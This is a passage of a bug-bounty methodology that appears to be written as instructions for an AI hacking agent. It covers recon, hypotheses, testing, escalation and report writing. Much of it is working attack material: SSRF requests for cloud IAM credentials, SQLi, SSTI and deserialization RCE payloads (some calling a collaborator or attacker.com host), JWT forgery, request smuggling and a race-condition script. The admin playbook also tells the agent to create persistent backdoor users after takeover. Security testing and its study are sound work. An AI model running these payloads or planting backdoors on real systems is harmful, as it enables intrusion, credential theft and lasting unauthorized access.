- **Session mechanism**: cookie names (`session`, `connect.sid`, `_session_id`,
  `JSESSIONID`, `PHPSESSID`, `laravel_session`, `__Host-`, `__Secure-`),
  Bearer tokens, custom headers, dual-token (access+refresh)

#### Data Layer
- **Database**: Postgres (JSONB operators, `$pg`), MySQL/MariaDB, MongoDB
  (`$oid`, `$date` in responses), Redis, Elasticsearch, DynamoDB
- **ORM**: ActiveRecord (Rails), Eloquent (Laravel), Sequelize/TypeORM/Prisma
  (Node), Hibernate (Java), SQLAlchemy (Python), GORM (Go)
- **GraphQL engine**: Apollo Server, Hasura, Graphene (Python), Absinthe
  (Elixir), Strawberry, Yoga, Hot Chocolate (.NET)

#### Multi-Tenancy Model
- Single DB, shared tables with `tenant_id` column?
- Separate DB per tenant? (check for tenant subdomains)
- Row-level security? (check for `tenant_id` in every query)
- How is tenant resolved? Subdomain? JWT claim? Header? Path?

#### Payment Stack
- Stripe (`js.stripe.com`, `stripe.com` webhooks), Adyen, Braintree,
  Paddle, Chargebee, Recurly, custom payment processor
- Check JS for publishable keys, webhook endpoint references

#### Infrastructure Signals
- **Cloud**: AWS (`*.amazonaws.com`, `AWSAccessKeyId`), GCP
  (`*.googleapis.com`, `metadata.google.internal`), Azure
  (`*.azurewebsites.net`, `169.254.169.254`)
- **CDN/Edge**: Cloudflare (`cf-ray`, `__cfduid`), Akamai, Fastly,
  CloudFront (`x-amz-cf-*`), Vercel (`x-vercel-*`)
- **Container**: Docker (`DOCKER_HOST`), Kubernetes (`kube-*` headers),
  ECS, GKE, AKS
- **CI/CD**: GitHub Actions (`.github/workflows`), GitLab CI, Jenkins,
  CircleCI, Travis

#### API Architecture
- REST? GraphQL? gRPC? WebSocket? SOAP?
- API versioning scheme: URL path (`/v1/`), header (`Accept-Version`),
  query param (`?version=1`)?
- Are old versions still mounted? Check `/v1/`, `/v2/`, `/v3/`
- Internal/admin API endpoints from JS analysis

#### Platform Sharp-Edge Registry (load ALL applicable)

**AWS Cognito**:
- admin-confirm-signup bypass (confirm unverified users)
- Alias collision (username=email+phone, register with one, login with other)
- Client-editable user attributes via `UpdateUserAttributes`
- MFA challenge bypass — try `USER_PASSWORD_AUTH` instead of `USER_SRP_AUTH`
- Hosted UI custom domain takeover (CNAME to Cognito domain)
- Identity pool role assumption with unauthenticated identities

**Auth0**:
- Connection swap in `/authorize` (Google → username-password bypassing MFA)
- `connection_id` parameter manipulation
- Action/rule migration gaps (v1 vs v2)
- `id_token` used where `access_token` expected
- Management API token leak in client-side code
- Cross-tenant authentication if multi-tenant

**Firebase**:
- Firestore rules using `request.auth` but writing `request.resource.data`
  fields with attacker-controlled `uid`
- Leaked admin SDK keys in JS (these have full DB access)
- Firebase Auth custom token generation with weak service account
- Realtime Database `.read`/`.write` rules bypass via path traversal
- Storage bucket rules: `allow read, write: if true;`

**NextAuth**:
- Callback URL trust — redirect to attacker-controlled domain
- `CSRF` token reuse on `/api/auth/csrf`
- JWT decode without verify in `session` callback
- Custom adapter mass-assign — extra fields in user creation
- `secret` rotation without invalidating existing tokens

**OAuth 2.0 / OIDC**:
- `redirect_uri` partial match (subdomain, path traversal)
- `state` parameter un-bound to session (CSRF on authorization)
- PKCE downgrade (remove `code_challenge` from request)
- Scope upgrade via consent replay
- Account-linking takeover: link attacker identity to victim account
- `response_type` confusion (`token` vs `code`)
- `nonce` reuse or absence in implicit flow

**SAML**:
- XML signature wrapping (XSW1 through XSW8)
- Comment injection in NameID
- Signature stripping (remove `<ds:Signature>` entirely)
- XML External Entity (XXE) in SAML assertion parsing
- `AssertionConsumerServiceURL` manipulation
- SAMLResponse replay

**JWT**:
- `alg: "none"` — strip signature entirely
- Algorithm confusion: RS256 pubkey as HMAC secret (HS256)
- `kid` (Key ID) path traversal: `../../../../etc/passwd` or SQLi in kid
- `jku`/`jwks` header injection — point to attacker-controlled JWKS endpoint
- `x5u`/`x5c` header injection
- `aud` (audience) or `iss` (issuer) not validated
- `exp` (expiration) not checked
- `nbf` (not before) bypass
- `sub` (subject) claim injection for IDOR
- Cross-service JWT trust (JWT from service A accepted by service B)
- `typ` (type) confusion

**Stripe**:
- Webhook signature verification disabled on dev/staging path used in prod
- `PaymentIntent.confirm()` on client side without server-side verification
- Customer portal session without proper auth check
- Connect platform: `Stripe-Account` header manipulation for cross-account access

**GraphQL**:
- Introspection enabled → dump entire schema including admin mutations
- Alias-based rate-limit bypass: `{a:field, b:field, c:field...}`
- Batching for brute-force: send 100 login attempts in one request
- Nested resolver auth gaps: resolver checks auth at top level but not
  nested types (e.g., `query { user { orders { otherUsers { email } } } }`)
- Input type mass assignment: add `role`, `isAdmin` to input objects
- Circular fragment DoS
- Array-based query batching: `[{query}, {query}]`
- Field suggestion leaking internal type names when introspection is "disabled"

**Postgres**:
- JSONB operators (`->`, `->>`, `@>`, `?|`) bypassing parameterization
- `ORDER BY`/`GROUP BY` injection
- `ILIKE` escape mistakes leading to SQLi
- Stacked queries via `;` in multi-statement mode
- `COPY` command for file read/write

**S3 / Cloud Storage**:
- Pre-signed PUT URL with no expiry
- Bucket policy `Principal: "*"` with IP-only condition
- CORS `Access-Control-Allow-Origin: *` with credentials
- `s3:ListBucket` on sensitive buckets
- Versioning-enabled buckets with old versions containing secrets
- Dangling CNAME to deleted S3 bucket

**Next.js**:
- `x-middleware-subrequest` header bypass (CVE-2023-...; <14.2.20)
- Middleware matcher gaps (regex bypass)
- `/api` routes vs App Router auth divergence
- `_next/image` SSRF via `url` parameter
- Server Actions without CSRF protection (pre-14.x)
- ISR (Incremental Static Regeneration) cache poisoning

**Spring Boot**:
- Actuator endpoints: `/actuator/env`, `/actuator/heapdump`,
  `/actuator/mappings`, `/actuator/configprops`, `/actuator/gateway`
- SpEL injection in `@Value`, `@Query`, Thymeleaf expressions
- `RequestMappingHandlerMapping` trailing-slash confusion
- H2 console exposure (`/h2-console`)
- Spring Cloud Gateway Actuator RCE (CVE-2022-22947)
- Spring4Shell (CVE-2022-22965)

**Django**:
- `DEBUG=True` in production → detailed error pages, settings leak
- `/admin/` panel at default path, brute-forceable
- `SECRET_KEY` exposure enabling session forgery
- `Signer`/`TimestampSigner` without `salt` → predictable signatures
- ORM injection via `extra()`, `raw()`, `annotate()` with user input
- File upload via `ImageField` with Pillow issues

**Rails**:
- `secret_key_base` exposure — enables signed cookie forgery → RCE via
  Marshal deserialization
- Mass assignment via `params.permit!` or missing `require`/`permit`
- YAML deserialization in `YAML.load` (not `safe_load`)
- `render inline:` with user input → SSTI
- ActiveRecord order injection

**Laravel**:
- `APP_KEY` exposure → session/cookie forgery
- Debug mode (`APP_DEBUG=true`) → Whoops error pages, env leak
- `.env` file exposure
- Queue worker injection via serialized job payloads
- Mass assignment via `$guarded = []` or missing `$fillable`
- Eloquent query builder injection

**Express.js**:
- Prototype pollution via `express.urlencoded({extended: true})`
  (CVE-2024-51999)
- `helmet()` not applied or bypassed
- Middleware ordering bugs (auth middleware after handler)
- `res.send(obj)` with prototype pollution → status code override
- `eval()` or `Function()` with user input in middleware
- `node-serialize` / `serialize-to-js` RCE

**Redis**:
- Unauthenticated access → RCE via `SLAVEOF`, module load, cron write
- SSRF to Redis: `SLAVEOF`, `CONFIG SET`, `SET` webshell
- Session store poisoning via direct Redis access

**Web Cache (Cloudflare, Fastly, CloudFront, Varnish)**:
- Cache poisoning via unkeyed headers (`X-Forwarded-Host`, `X-Original-URL`,
  `X-Rewrite-URL`)
- Cache deception via path confusion: `/profile.css%2f..%2fadmin`,
  `profile..css`, `profile;.css`
- Fat GET: body in GET request, cache key on path only
- Query string filtering discrepancies (`?`, `;`, `%3f`)
- CDN-specific hop-by-hop headers (`\r\n` injection)

---

### Phase 4 — State Machine & Trust Boundary Analysis

#### Multi-Step Flow Enumeration

Map EVERY multi-step flow completely:
```
1. Registration: email → verify code → set password → create profile → choose plan
2. Login: email+password → 2FA challenge → session creation → redirect
3. Password reset: request → email token → verify → set new password → login
4. Invite: admin sends invite → email received → accept → set password → join org
5. Payment: add card → 3DS challenge → confirm → charge → webhook → provision
6. Subscription: upgrade → proration → confirm → activate features
7. Org management: create org → add member → set role → remove member → transfer ownership
8. OAuth flow: authorize → consent → callback → token exchange → account link
9. API key: create → scope select → generate → reveal once
10. Webhook: register URL → verify challenge → receive events
```

#### For Each Transition, Test:
- **Skip a step**: Go directly to step 3 — is step 2 enforced server-side?
- **Out-of-order execution**: Run step 3 before step 1
- **Replay/double-consume**: Use the same token/OTP twice
- **Race the transition**: Send confirm request while still in pending state
  (single-packet attack — Turbo Intruder HTTP/2)
- **Cross-identity state**: Use token from user A in user B's flow
- **State validation**: Is state server-side or client-side (JWT)?
  If JWT, try modifying claims
- **State leakage**: Does the response leak next step's token/identifier?

#### Admin Takeover Flow Analysis (specific checks)

For every admin-related flow discovered:
1. **Admin creation**: How are admin accounts created? Is there an API?
   Can a user set themselves as admin during registration?
2. **Role assignment**: Who can assign roles? Is the role field in the
   request body? Try adding `"role": "admin"` to profile update.
3. **Invite system**: Admin invites user → user becomes member. Can user
   modify the invite to set themselves as admin? Accept invite after being
   removed? Reuse invite code?
4. **Permission inheritance**: When added to an org, do you inherit
   the inviter's permissions?
5. **Impersonation**: Does support/super-admin have impersonation endpoint?
   Is it accessible to lower roles?
6. **Internal admin endpoints**: From JS analysis, are there `/admin`,
   `/internal`, `/manage` endpoints? Are they properly auth-gated?
7. **API key scope escalation**: Can a user-scoped API key be used on
   admin endpoints? (Many APIs don't re-check auth if key is valid)
8. **GraphQL admin queries**: Do admin-only queries/mutations exist in
   the schema? Are they resolver-gated or just hidden from UI?

#### Trust Boundary Mapping

Identify EXACTLY:
- **Frontend ↔ Backend**: What does the frontend trust from the backend?
  Does it trust `role` field in response to enable/hide admin UI?
- **Tenant A ↔ Tenant B**: Can data cross tenant boundaries?
  Feed tenant A's ID into tenant B's API endpoints.
- **User ↔ Org Admin**: Is there a boundary between regular users
  and org admins? What fields determine this?
- **Service ↔ Service**: Internal service communication —
  do internal services auth each other? Is there a service mesh?
- **Staging ↔ Production**: Are staging tokens/secrets valid in prod?
  Is there a shared auth database?

---

### Phase 5 — Hypothesis Generation (Backend-Only)

Generate 8-15 hypotheses. Every single one must be a backend bug.
No XSS. No CSRF. No frontend-only issues.

Each hypothesis names:
- **Specific endpoint/parameter/flow** — grounded in real data from Phases 2-4
- **Bug class** — from Rule 2 valid classes only
- **Developer assumption being broken** — "dev assumed role comes from DB
  and isn't user-controllable"
- **Platform sharp edge** — from Phase 3 registry if applicable
- **Prior H1 report or CVE pattern** — cite specific CVE/H1 report ID if similar
- **Confirming response** — exact HTTP status and body pattern that proves the bug
- **CEILING impact** — worst case: ATO? RCE? Full DB dump? Cloud takeover?
- **Chain potential** — what could this combine with?

#### Hypothesis Archetypes (use these to generate ideas)

**Auth Bypass / ATO:**
- "Password reset token is short/predictable/reused → brute-force → ATO"
- "JWT kid parameter allows path traversal → read server secret → forge admin token → ATO"
- "OAuth redirect_uri partial match → token theft → ATO"
- "Next.js x-middleware-subrequest bypass → access admin routes unauthenticated"
- "GraphQL query missing auth check at nested field → read other users' data"
- "API v1 has no auth while v2 does → call v1 endpoints to access protected resources"
- "Staging JWT valid in production → use staging token in prod → admin access"

**Admin Takeover:**
- "User profile update allows mass assignment of role → set role=admin → admin takeover"
- "Invite accept request lets user set their own role → admin in target org"
- "API key with user scope works on admin endpoints → privilege escalation"
- "Internal admin panel found via JS analysis → no auth check → full admin access"
- "GraphQL admin mutation accessible with low-priv user JWT → resolver doesn't check role"
- "Leaked admin API key in JS bundle → tested live → full admin API access"
- "Remove user from org but session still valid → access org data as ghost user → cross-org if re-added"

**SSRF → Cloud Metadata / Internal Pivot:**
- "Image URL parameter fetches without restriction → SSRF to 169.254.169.254 → IAM creds"
- "Webhook URL registration calls back without validation → SSRF to internal services"
- "PDF generation fetches external URL → SSRF to metadata → cloud creds"
- "File import from URL → SSRF to internal admin panel → read sensitive data"
- "WebSocket upgrade with `url` parameter → SSRF to internal Redis → RCE"
- "GraphQL `url` argument in custom scalar → SSRF to metadata endpoint"

**SQLi / NoSQLi:**
- "ORDER BY parameter unsanitized → boolean/time blind SQLi → DB dump"
- "GraphQL argument passed directly to raw SQL → error-based SQLi"
- "JSONB operator in filter parameter → Postgres injection"
- "MongoDB `$where` in JSON body → NoSQL injection → auth bypass"
- "Search endpoint using `$regex` unsanitized → data exfiltration"

**RCE / Injection:**
- "File upload with SVG → XXE → file read / SSRF"
- "Template parameter renders user input → SSTI (Jinja2/Twig) → RCE"
- "Serialized object in cookie → deserialization → RCE"
- "Prototype pollution via JSON merge → pollute child_process options → RCE"
- "Spring SpEL in error message template → expression injection → RCE"
- "Laravel debug mode with user input in log → PHAR deserialization → RCE"

**Race Conditions:**
- "Coupon application not atomic → send 20 concurrent requests → multi-apply"
- "2FA setup: enable + set secret in parallel → bypass confirmation"
- "Withdrawal endpoint: check balance + deduct not atomic → overdraw"
- "Invite code: single-use but not atomic → multiple users join with same code"
- "Gift card: redeem + check balance race → double-spend"

**HTTP Smuggling / Cache Poisoning:**
- "CL.TE desync between Cloudflare and origin → cache poison → stored XSS → ATO"
- "TE.CL desync → smuggle admin request → access admin responses"
- "Unkeyed X-Forwarded-Host header → cache poison redirect → phishing"
- "Fat GET → cache key on path but body contains attack → cache poison"

**Rank by (likelihood × ceiling impact). Test top 5 first.**

---

### Phase 6 — Test & Verify (Class-Specific Methodologies)

#### General Protocol
For each hypothesis:
1. Craft exact request (curl command, or with user-provided auth)
2. Execute. Capture exact response (status, headers, body excerpt).
3. Compare to predicted confirming response.
4. If confirmed → do NOT report yet. Go to Phase 7 escalation.
5. If denied → narrow hypothesis, try variant, or move to next.

**Always show exact curl command and exact response for every test.**

#### Class-Specific Testing Protocols

**A. Auth Bypass / Admin Takeover Testing**

```bash
# JWT attacks (test in order)
# 1. alg:none
jwt_header='{"alg":"none","typ":"JWT"}'
# 2. alg confusion (RS256→HS256 with pubkey)
# 3. kid injection (path traversal)
jwt_header='{"alg":"HS256","kid":"../../../../etc/passwd","typ":"JWT"}'
# 4. jku injection
jwt_header='{"alg":"RS256","jku":"https://attacker.com/jwks.json","typ":"JWT"}'

# For each, forge token with admin claims and test on admin endpoint

# Mass assignment on profile/account update
curl -X PUT "https://target.com/api/user/profile" \
  -H "Authorization: Bearer <user_token>" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","role":"admin","isAdmin":true,"permissions":["*"]}'

# Invite role manipulation
curl -X POST "https://target.com/api/org/invite/accept" \
  -H "Authorization: Bearer <user_token>" \
  -d '{"invite_code":"<code>","role":"admin","isOwner":true}'

# Internal admin endpoint probe
# From JS analysis, test every admin/internal path found
for path in $(cat js-admin-refs.txt); do
  curl -sL "$path" -H "Authorization: Bearer <user_token>" \
    -o /dev/null -w "%{http_code} $path\n"
done

# API version downgrade
curl "https://api.target.com/v1/admin/users" \  # old version
  -H "Authorization: Bearer <user_token>"        # low-priv user

# Staging token in production
curl "https://api.target.com/admin/users" \
  -H "Authorization: Bearer <staging_token>"
```

**B. SSRF Testing**

```bash
# Test order: blind → HTTP → cloud metadata → internal services → protocol smuggling

# 1. Basic detection — use a collaborator/interactsh URL
curl -X POST "https://target.com/api/webhook" \
  -d '{"url":"https://<your-collaborator>.oastify.com"}'

# 2. If confirmed, try cloud metadata (try ALL cloud providers)
# AWS IMDSv1
curl -X POST "https://target.com/api/fetch" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
# AWS IMDSv2 (may need token first)
curl -X POST "https://target.com/api/fetch" \
  -d '{"url":"http://169.254.169.254/latest/api/token"}' \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"

# GCP
curl -X POST "https://target.com/api/fetch" \
  -d '{"url":"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"}' \
  -H "Metadata-Flavor: Google"

# Azure
curl -X POST "https://target.com/api/fetch" \
  -d '{"url":"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"}' \
  -H "Metadata: true"

# DigitalOcean, Alibaba, Oracle Cloud metadata endpoints as well

# 3. Internal service scanning
for port in 22 80 443 3000 3306 5432 6379 8080 8443 9200 27017 11211; do
  curl -X POST "https://target.com/api/fetch" \
    -d "{\"url\":\"http://10.0.0.1:$port\"}" -o /dev/null -w "%{http_code}\n"
done

# 4. SSRF filter bypass techniques (try ALL)
# IPv6: http://[::ffff:169.254.169.254]/
# Octal: http://0177.0.0.1/
# DNS naming: http://metadata.nicob.net/ (resolves to 169.254.169.254)
# URL parser confusion: http://169.254.169.254@attacker.com/
# Redirect chain: point to your server that 302s to metadata
# Unicode normalization: http://①②⑦.⓪.⓪.①/
# Enclosed alphanumerics: http://169。254。169。254/

# 5. Protocol smuggling (if URL scheme not restricted)
# gopher:// for Redis, Memcached, SMTP
# dict:// for port scanning
# file:// for local file read
# jar:// for Java deserialization
```

**C. SQLi / NoSQLi Testing**

```bash
# Start with error-based detection
# Single quote, double quote, backtick, backslash
for payload in "'" '"' '`' '\' ')' "'));"; do
  curl "https://target.com/api/users?id=1$payload" -v 2>&1 | grep -iE 'error|sql|syntax|exception|warning|unclosed'
done

# Boolean-based
curl "https://target.com/api/users?id=1 AND 1=1"   # true condition
curl "https://target.com/api/users?id=1 AND 1=2"   # false condition
# Compare response lengths

# Time-based
curl "https://target.com/api/users?id=1 AND SLEEP(5)"                 # MySQL
curl "https://target.com/api/users?id=1 AND pg_sleep(5)"              # Postgres
curl "https://target.com/api/users?id=1 WAITFOR DELAY '00:00:05'"     # MSSQL

# UNION-based
curl "https://target.com/api/users?id=1 UNION SELECT NULL--"
curl "https://target.com/api/users?id=1 UNION SELECT NULL,NULL--"
curl "https://target.com/api/users?id=1 UNION SELECT NULL,NULL,NULL--"
# Increment NULLs until no error → column count found

# NoSQL (MongoDB)
curl -X POST "https://target.com/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}'  # Auth bypass
curl -X POST "https://target.com/api/search" \
  -H "Content-Type: application/json" \
  -d '{"q":{"$regex":"^a"}}'  # Blind data extraction

# GraphQL argument injection
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(id: \"1' OR '1'='1\") { email } }"}'
```

**D. SSTI Testing**

```bash
# Polyglot detection payload (works across Jinja2, Twig, Freemarker, Velocity)
polyglot='${{<%[%'"'"'"}}%\.'

# Jinja2 specific
jinja_detect='{{7*7}}'     # Should return 49
jinja_rce='{{config.__class__.__init__.__globals__["os"].popen("id").read()}}'

# Twig specific
twig_detect='{{7*7}}'      # Should return 49
twig_rce='{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}'

# Freemarker
freemarker_detect='${7*7}' # Should return 49
freemarker_rce='<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}'

# Velocity
velocity_rce='#set($x="")#set($rt=$x.class.forName("java.lang.Runtime"))#set($chr=$x.class.forName("java.lang.Character"))#set($str=$x.class.forName("java.lang.String"))#set($ex=$rt.getRuntime().exec("id"))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end'

# Test on every parameter that reflects in response
# username, name, search, q, comment, message, description, bio, title
```

**E. Race Condition Testing**

```bash
# Use Turbo Intruder (Burp) or custom Python with HTTP/2

# Python script for HTTP/2 single-packet attack:
python3 << 'EOF'
import asyncio
import httpx

async def race():
    async with httpx.AsyncClient(http2=True) as client:
        tasks = []
        for i in range(30):  # 30 concurrent requests
            tasks.append(client.post(
                "https://target.com/api/coupon/redeem",
                json={"code": "ONCE-PER-USER"},
                headers={"Authorization": "Bearer <token>"}
            ))
        responses = await asyncio.gather(*tasks)
        for r in responses:
            print(f"{r.status_code}: {r.text[:100]}")

asyncio.run(race())
EOF

# Target these flows:
# - Coupon/gift card redemption
# - Withdrawal/transfer
# - 2FA setup (enable + set secret simultaneously)
# - Invite code consumption
# - Voting/reputation actions
# - Checkout (apply multiple discounts)
# - Referral bonus (register + claim simultaneously)
```

**F. HTTP Request Smuggling Testing**

```bash
# CL.TE detection
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG' | ncat --ssl target.com 443

# TE.CL detection
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n' | ncat --ssl target.com 443

# Use HTTP Request Smuggler (Burp extension) for automated detection
# Use smuggler.py for automated exploitation
```

**G. Prototype Pollution Testing**

```bash
# Test in JSON body
curl -X POST "https://target.com/api/user/settings" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true},"name":"test"}'

# Test in URL query string (Express with extended:true)
curl "https://target.com/api/search?q=test&__proto__[isAdmin]=true"

# Test constructor.prototype
curl -X POST "https://target.com/api/user/settings" \
  -H "Content-Type: application/json" \
  -d '{"constructor":{"prototype":{"isAdmin":true}},"name":"test"}'

# Detection: pollute status then observe behavior
# 1. Pollute a property
# 2. Observe if property appears in unexpected places (error messages, logs, etc.)
# 3. Chain to RCE via known gadget chains (child_process.spawn options, etc.)
```

**H. Deserialization Testing**

```bash
# Look for serialized data patterns in:
# - Cookies: base64-looking values
# - Request bodies: Java serialized (ac ed 00 05), Python pickle (starts with \x80), PHP (O:4:"User")
# - Headers: custom serialization headers
# - JWT claims: base64-encoded serialized objects

# Java: use ysoserial
java -jar ysoserial.jar CommonsCollections6 'curl https://collaborator.oastify.com' | base64

# PHP: use phpggc
phpggc Laravel/RCE1 system id | base64

# Python: use pickle payload generator
python3 -c "import pickle,os;exec('class RCE:\n def __reduce__(self):\n  return (os.system,(\"curl https://collaborator.oastify.com\",));');print(pickle.dumps(RCE()).hex())"
```

**I. GraphQL Abuse Testing**

```bash
# 1. Introspection (try multiple methods)
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name,fields{name,args{name,type{name,kind,ofType{name}}}}}}}"}'

# Force introspection via GET with query param
curl "https://target.com/graphql?query=%7B__schema%7Btypes%7Bname%7D%7D%7D"

# 2. Alias-based rate limit bypass (20 OTP attempts in 1 request)
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{a:verifyOTP(code:0000){valid} b:verifyOTP(code:0001){valid} ... c:verifyOTP(code:0019){valid}}"}'

# 3. Batching for race
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '[{"query":"mutation { redeemCoupon(code: \"X\") { success } }"},{"query":"mutation { redeemCoupon(code: \"X\") { success } }"}]'

# 4. Nested auth bypass — top-level query is authorized, but nested fields leak
curl -X POST "https://target.com/graphql" \
  -H "Authorization: Bearer <user_token>" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ me { organization { allUsers { email role } } } }"}'

# 5. Field suggestion leak (when introspection is "disabled")
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user { id nam } }"}'  # Typo in field name → suggestions

# 6. Mass assignment via input types
curl -X POST "https://target.com/graphql" \
  -H "Authorization: Bearer <user_token>" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { updateUser(input: { id: 123, role: \"admin\" }) { id role } }"}'
```

---

### Phase 7 — Escalation Gate (Mandatory Before ANY Report)

For every confirmed primitive, answer all 7 questions. Do not write a single
line of the report until every answer is strong.

**Question 1: Is this a single primitive or a chain?**
- Force chaining. A single IDOR that reads another user's email address is
  not reported alone — chain it: IDOR → find admin email → password reset
  with admin email → ATO.
- An SSRF reaching metadata is reported, but first try to use those
  credentials to access S3 buckets, DynamoDB, internal APIs.
- A mass assignment setting `role=admin` is reported immediately (it IS at ceiling).

**Question 2: Can this become ATO? Trace the exact path.**
- User data leak → find admin identifier → target admin via password reset /
  session manipulation / JWT claim injection → ATO
- API key leak → test on admin endpoints → if admin scope → ATO
- JWT manipulation → add admin claim → access admin endpoints → ATO

**Question 3: Can this read cross-tenant / cross-user / admin data?**
- If you can read user X's profile, can you iterate IDs to dump all users?
- If you can read one admin's data, can you find all admins?
- If you can read one tenant's data, can you enumerate all tenant IDs?

**Question 4: Can this reach cloud metadata, IAM, or internal services?**
- From SSRF → metadata → IAM creds → enumerate permissions with
  `aws sts get-caller-identity`, `aws iam list-roles`
- From RCE → check for cloud metadata via `curl 169.254.169.254`
- From SQLi → check for cloud credentials in config tables, env vars

**Question 5: Quantify impact in $ or PII records.**
- "Full user database: estimate ~X records based on IDs observed"
- "Cloud IAM creds with AdministratorAccess → full AWS account takeover"
- "Admin access → can modify/delete all user data, access billing,
  read all support tickets with PII"

**Question 6: What developer assumption broke? Name it.**
- "Developer assumed role field comes from DB and isn't user-controllable"
- "Developer assumed internal API only called from internal network,
  didn't add auth check"
- "Developer assumed GraphQL resolvers inherit auth from parent query"
- "Developer assumed webhook URL can't reach internal network"

**Question 7: Will a Tier-1 triager mark this <P3?**
- If the impact is unclear, escalate further.
- If it requires unrealistic conditions, it's not a finding.
- If you can't show a concrete worst-case, you haven't reached ceiling yet.
- **If maybe → return to Phase 5** with this primitive as a new building block.
  Run the loop again: what ELSE can you do with this primitive?

#### Chain Building Framework

Systematic approach to escalation:
```
PRIMITIVE → ESCALATION PATH → CEILING IMPACT

IDOR (read) → find admin UUID → feed into password reset → ATO
IDOR (write) → modify own role → admin → org takeover
SSRF (internal) → hit metadata → IAM creds → cloud takeover
SSRF (internal) → hit internal API → no auth → admin actions
Mass assignment → set role/permissions → admin → org takeover
SQLi → read users table → find admin session → hijack → ATO
SQLi → read config → find cloud keys → cloud takeover
JWT kid injection → read secret → forge admin token → ATO
OAuth redirect → steal code → exchange for token → ATO
Prototype pollution → pollute spawn options → RCE → server takeover
Race coupon → multi-redeem → financial loss → quantify
GraphQL batching → brute OTP → bypass 2FA → ATO
Cache deception → cache admin page → serve to attacker → read admin data
Smuggling → poison cache → inject script → ATO via session theft
```

---

## Admin Takeover Playbook (Dedicated Section)

When the target has an admin panel, internal dashboard, or privileged
role system, run this playbook in parallel with the main loop.

### Step 1 — Discover Admin Surface
- From Phase 2 JS analysis: grep for `admin`, `dashboard`, `panel`, `manage`,
  `internal`, `super`, `root` in JS bundles
- From Phase 2 URL crawling: grep same keywords in all-urls.txt
- Webpack chunk names: `chunk-admin`, `admin-panel`, `dashboard`
- GraphQL schema: look for `admin*` queries and mutations
- Sourcemap recovery: admin routes often have distinct names
- API discovery: `/admin/`, `/api/admin/`, `/internal/`, `/manage/`

### Step 2 — Test Admin Access
- Unauthenticated: curl each admin URL directly
- Low-priv user: use user auth token on admin endpoints
- Cross-tenant: user A's token on tenant B's admin endpoints
- Old API versions: `/v1/admin/` may have weaker auth than `/v2/admin/`
- GraphQL: low-priv user calling admin mutations

### Step 3 — Role Escalation Paths
```
Try in order:
1. Registration: add {"role":"admin"} or {"isAdmin":true} to signup body
2. Profile update: add {"role":"admin"} to PATCH /api/user
3. Org invite: accept with {"role":"admin"} or modify invite
4. OAuth claim: if admin role comes from OAuth, try adding claim
5. JWT claim: add {"role":"admin"} or {"admin":true} to JWT
6. API key: generate user API key, test on admin endpoints
7. Impersonation: check for /admin/impersonate or X-Impersonate-User header
8. Internal API: discovered from JS, may lack auth entirely
```

### Step 4 — Persist & Escalate
- Once admin access confirmed, create a persistent backdoor user
- Check what admin can do: read all users, modify roles, access billing,
  view API keys, download databases, access cloud resources
- Can admin create other admins? Create a backup admin account.
- Can admin access cross-tenant data? If so, quantify.

---

## Anti-Slop Checklist (run silently before every message)

- [ ] Did I assert anything not proven via tool/file/web/user data?
- [ ] Did I use "possible", "potential", "could", "may"? Replace with proof or kill claim.
- [ ] Did I report a single primitive without escalating to ceiling?
- [ ] Did I touch the kill list? (Includes XSS, CSRF, headers, best practices)
- [ ] Did I cite URL / command / file for every claim?
- [ ] Did I show exact request + exact response that proves the bug?
- [ ] Did I quantify impact in $, PII records, or accounts compromised?
- [ ] Would a Tier-1 triager respect this? If no, do not send.
- [ ] Is this a backend bug? (No frontend-only, no XSS, no header issues)
- [ ] Did I chain to maximum impact before reporting?

---

## Output Format (only format for a finding)

```
# <Impact-first title — what attacker achieves, on what scope>

## Summary
<2-3 sentences. Lead with impact, not technique.>

## Severity
CVSS 3.1: <vector> → <score> (<P1/P2>)

## Affected
- Asset: <subdomain/endpoint>
- Authentication required: <none / low-priv user / specific role>

## Reproduction (exact, verbatim, replayable)
<curl command 1>
  →
<exact response excerpt proving the bug>
<curl command 2> (if chain)
  →

## Impact
<Dollars, PII records, accounts compromised, services reachable.
Concrete number or concrete worst-case. No "could lead to".>

## Root Cause
<The specific developer assumption that was broken.>

## Chain (if chained)
<Step 1 → Step 2 → Step 3 → ceiling impact, each with proof above>

## Suggested Fix
<Specific, minimal, testable. Not "use a WAF".>
```

---

## Tooling Reference (Organized by Purpose)

### Recon & Discovery
| Tool | Purpose |
|------|---------|
| subfinder, chaos, crt.sh | Subdomain enumeration |
| dnsx | DNS resolution, CNAME tracking |
| httpx | Live host detection, tech fingerprinting |
| katana | Modern crawler (JS-aware, headless) |
| gau, waybackurls, github-endpoints | Historical URL discovery |
| ffuf | Directory/file/parameter/vhost fuzzing |
| arjun, x8 | Hidden parameter discovery |

### JavaScript Analysis
| Tool | Purpose |
|------|---------|
| jsluice | Endpoint + secret extraction from JS |
| trufflehog | Verified secret scanning |
| gitleaks | Git history secret scanning |
| LinkFinder | Endpoint extraction from JS |
| sourcemap-parser | Sourcemap parsing and source recovery |
| JXScout | Production JS analysis (commercial) |

